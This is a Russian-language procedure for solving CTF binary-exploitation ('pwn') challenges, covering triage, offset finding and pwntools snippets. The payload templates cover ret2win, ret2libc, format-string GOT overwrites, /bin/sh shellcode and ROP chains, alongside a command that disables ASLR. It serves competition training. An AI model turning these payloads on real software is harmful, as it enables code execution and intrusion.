# PWN — процедура

> Команды: `CTF_CHEATSHEET.md` → раздел PWN. Шаблон эксплойта: `pwn-new <binary>`.
> Локальный libc: `pwninit` / `patchelf`.

## 0. Данные

- локальный бинарник (`files/chall`) + часто `libc.so.6`, `ld-linux-x86-64.so.2`
- удалённый сервис: `nc host port` (иногда дают только это)

```bash
ctf-init pwn-babyheap && cd pwn-babyheap
cp /path/chall files/ && pwn-new files/chall --remote 10.10.10.10:1337
```

## 1. Триаж

```bash
enum-bin files/chall          # checksec, libc, UPX, импорты, секции
```
Читай вывод как чек-лист возможностей:

| Защита | Если выключена |
| --- | --- |
| NX off | shellcode на стеке |
| No PIE | адреса функций фиксированы → `elf.sym['win']` |
| No Canary | переполнение до ret без утечек |
| No RELRO / partial | перезапись GOT через `fmtstr_payload`/arb write |

## 2. Понять логику

1. `r2 -A files/chall` → `afl`, `pdf @ main`.
2. Ghidra: найти `main`, затем `vuln`/`win`; ищи `gets`, `read`, `strcpy`, `system`,
   `printf(user_input)`, `fgets(..., size > buf)`.
3. `strings -n 6`, `ltrace ./chall`, `strace ./chall` — быстро вскрывает проверки.
4. Формат ввода определи по промптам: сколько читается, куда, каким размером.

## 3. Найти оффсет

```bash
gdb -q ./chall
> pattern create 200        # pwndbg/gef
> run
> pattern offset $pc        # или печать $rip
```
или в pwntools: `offset = cyclic_find(p64_value)`.

## 4. Выбрать атаку

### 4.1 ret2win
```python
payload = flat(b'A' * offset, p64(elf.sym['win']))
```
Проверь выравнивание: если падает в `movaps`, добавь `ret` перед адресом.

### 4.2 ret2libc (NX on, ASLR)
1. Утечка: `rop.puts(elf.got['puts']); rop.call('main')`.
2. `libc.address = leak - libc.sym['puts']`.
3. Второй payload: `p64(ret)` + `pop rdi` + `binsh` + `system`.
4. Нет интерпретатора/чужой libc → `pwninit` (патчит и генерит шаблон).

### 4.3 Format string
1. Определи позицию: `%7$p`, метки `AAAA%7$p`.
2. Читаем адреса (leak libc/canary), пишем через `%n`:
   ```python
   payload = fmtstr_payload(offset, {elf.got['exit']: elf.sym['win']})
   ```
3. Полезно: `elf.got`, `objdump -d | grep -B5 printf`.

### 4.4 Shellcode (NX off)
```python
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(offset, b'\x90') + p64(addr_of_buf)
```
Возьми реальный адрес буфера из gdb (`p &buf`), только если PIE выключен.
`msfvenom -p linux/x64/exec CMD=/bin/sh -f python` — альтернатива.

### 4.5 Heap
- Сначала `heap`, `bins`, `chunks` в gdb+pwndbg; затем смотри glibc-версию
  (`strings libc.so.6 | grep 'GNU C Library'`) — техники зависят от версии (tcache/unsorted).
- Классика jeopardy: tcache poisoning, UAF, fastbin dup, house of force (старые libc).

### 4.6 ROP-цепочка
```bash
ROPgadget --binary files/chall --only "pop|ret"
ROPgadget --binary files/chall | grep 'pop rdi'
one_gadget ./libc.so.6
```
При нехватке гаджетов используй ret2csu, ret2dlresolve или `ROP(libc)`.

## 5. Формат-строки ввода/вывода

- Многошаговые протоколы: `io.recvuntil(b'...')` **именно** то, что печатает бинарь.
- Логирование: `context.log_level='debug'` — увидишь точный обмен.
- Не забывай `io.interactive()` в конце.

## 6. Локально → удалённо

1. Всегда сначала локально: `python3 solve.py` (адреса поменяются — проверь, что нет
   хардкода локальных адресов, кроме чистого ret2win).
2. Затем `python3 solve.py REMOTE`.
3. Если локально работает, а удалённо нет: различие libc (утечка версии или
   предположительный libc из репо организаторов), разные флаги сборки.
4. Флаг обычно в `flag.txt`/`/flag` — `cat flag*` после получения shell.

## 7. Финал

- `cat flag.txt`, скопируй флаг в команду.
- Сохрани `solve.py` рядом с бинарником, допиши на странице задания в Notion оффсеты,
  libc-версию и применённую технику (это и есть райтап).

## Быстрые напоминания

- Проверяй выравнивание стека (`ret`-слайд) при SIGSEGV в libc.
- `context.binary` задаёт arch/endian — не забывай.
- `pwndbg`/`gef` установи заранее, это экономит минуты на каждом шаге.
- ASLR отключается для отладки: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`.
